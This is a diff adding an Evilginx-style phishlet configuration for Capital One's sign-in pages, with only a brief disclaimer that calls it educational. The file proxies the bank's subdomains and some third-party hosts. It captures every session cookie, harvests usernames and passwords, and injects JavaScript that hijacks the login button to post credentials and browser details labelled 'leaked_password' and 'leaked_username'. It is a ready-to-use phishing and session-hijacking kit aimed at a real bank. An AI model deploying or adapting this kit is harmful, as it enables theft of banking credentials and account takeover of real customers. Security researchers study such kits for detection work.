@@ -1,0 +1,131 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+
+
+author: '@AN0NUD4Y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'verified', orig_sub: 'verified', domain: 'capitalone.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'capitalone.com', session: true, is_landing: false}
+  - {phish_sub: 'tms', orig_sub: 'tms', domain: 'capitalone.com', session: true, is_landing: false}
+  - {phish_sub: 'deviceinfo', orig_sub: 'deviceinfo', domain: 'capitalone.com', session: true, is_landing: false}
+  - {phish_sub: 'potomac-clickstream', orig_sub: 'potomac-clickstream', domain: 'capitalone.com', session: true, is_landing: false}
+  - {phish_sub: 'uba', orig_sub: 'uba', domain: 'capitalone.com', session: true, is_landing: false}
+  - {phish_sub: 'ecm', orig_sub: 'ecm', domain: 'capitalone.com', session: true, is_landing: false}
+  - {phish_sub: 'bfp', orig_sub: 'bfp', domain: 'capitalone.com', session: true, is_landing: false}
+  - {phish_sub: 'm', orig_sub: 'w', domain: 'usabilla.com', session: true, is_landing: false}
+  - {phish_sub: 'cdn', orig_sub: 'six', domain: cdn-net.com', session: true, is_landing: false}
+
+#six.cdn-net.com
+#w.usabilla.com
+
+sub_filters:
+  - {triggers_on: 'www.capitalone.com', orig_sub: 'www', domain: 'capitalone.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.capitalone.com', orig_sub: 'www', domain: 'capitalone.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.capitalone.com', orig_sub: 'www', domain: 'capitalone.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.capitalone.com', orig_sub: '', domain: 'capitalone.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.capitalone.com', orig_sub: '', domain: 'capitalone.com', search: 'https://{domain_regexp}', replace: 'https://{domain_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.capitalone.com', orig_sub: '', domain: 'capitalone.com', search: 'https%3A%2F%2{domain}/', replace: 'https%3A%2F%2{domain}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'verified', domain: 'capitalone.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'verified', domain: 'capitalone.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'verified', domain: 'capitalone.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+#  - {triggers_on: 'verified.capitalone.com', orig_sub: '', domain: 'capitalone.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+#  - {triggers_on: 'verified.capitalone.com', orig_sub: '', domain: 'capitalone.com', search: 'https://{domain_regexp}', replace: 'https://{domain_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+#  - {triggers_on: 'verified.capitalone.com', orig_sub: '', domain: 'capitalone.com', search: 'https%3A%2F%2{domain}/', replace: 'https%3A%2F%2{domain}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'w', domain: 'usabilla.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'w', domain: 'usabilla.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'w', domain: 'usabilla.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'six', domain: 'cdn-net.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'six', domain: 'cdn-net.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'six', domain: 'cdn-net.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'potomac-clickstream', domain: 'capitalone.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'potomac-clickstream', domain: 'capitalone.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'potomac-clickstream', domain: 'capitalone.com', search: 'https%3A%2F%2{hostname}', replace: 'https%3A%2F%2{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'potomac-clickstream', domain: 'capitalone.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'tms', domain: 'capitalone.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'tms', domain: 'capitalone.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'tms', domain: 'capitalone.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'deviceinfo', domain: 'capitalone.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'deviceinfo', domain: 'capitalone.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'deviceinfo', domain: 'capitalone.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'uba', domain: 'capitalone.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'uba', domain: 'capitalone.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'uba', domain: 'capitalone.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'ecm', domain: 'capitalone.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'ecm', domain: 'capitalone.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'ecm', domain: 'capitalone.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'bfp', domain: 'capitalone.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'bfp', domain: 'capitalone.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'verified.capitalone.com', orig_sub: 'bfp', domain: 'capitalone.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+
+auth_tokens:
+  - domain: 'capitalone.com'
+    keys: ['.*,regexp']
+  - domain: 'www.capitalone.com'
+    keys: ['.*,regexp']
+  - domain: '.capitalone.com'
+    keys: ['.*,regexp']
+  - domain: 'verified.capitalone.com'
+    keys: ['.*,regexp']
+    
+auth_urls:
+  - '/accountSummary' 
+
+auth_tokens:
+  - domain: '.capitalone.com'
+    keys: ['igsessionid','C1_AMT','C1_SSCD','C1_SSES','.*,regexp']
+
+  
+credentials:
+  username:
+    key: 'leaked_username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'leaked_password'
+    search: '(.*)'
+    type: 'post'  
+  custom:
+    - key: 'useragent'
+      search: '(.*)'
+      type: 'post'
+    - key: 'browser'
+      search: '(.*)'
+      type: 'post'
+    - key: 'engine'
+      search: '(.*)'
+      type: 'post'  
+    - key: 'platform'
+      search: '(.*)'
+      type: 'post'  
+
+login:
+  domain: 'verified.capitalone.com'
+  path: '/auth/signin'
+
+js_inject:
+  - trigger_domains: ["verified.capitalone.com"]
+    trigger_paths: ["/auth/signin", "/auth/signin*"]
+    trigger_params: []
+    script: |  
+      function onclickListener(){
+        var submit = document.querySelectorAll('button[type=submit]')[0];
+        submit.setAttribute("onclick", "sendData()");
+        document.querySelectorAll("input")[2].click();
+        return;
+      }
+      function sendData(){
+        var username = document.querySelectorAll("input")[0].value;
+        var password = document.querySelectorAll("input")[1].value;
+        var useragent = navigator.userAgent;
+        var browser = navigator.appName;
+        var engine = navigator.product;
+        var platform = navigator.platform;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("leaked_password="+encodeURIComponent(password)+" &"+" leaked_username="+encodeURIComponent(username)+" &"+" useragent="+encodeURIComponent(useragent)+" &"+" browser="+encodeURIComponent(browser)+" &"+" engine="+encodeURIComponent(engine)+" &"+" platform="+encodeURIComponent(platform));
+        return;
+      }
+      setTimeout(function(){ onclickListener(); }, 2500);
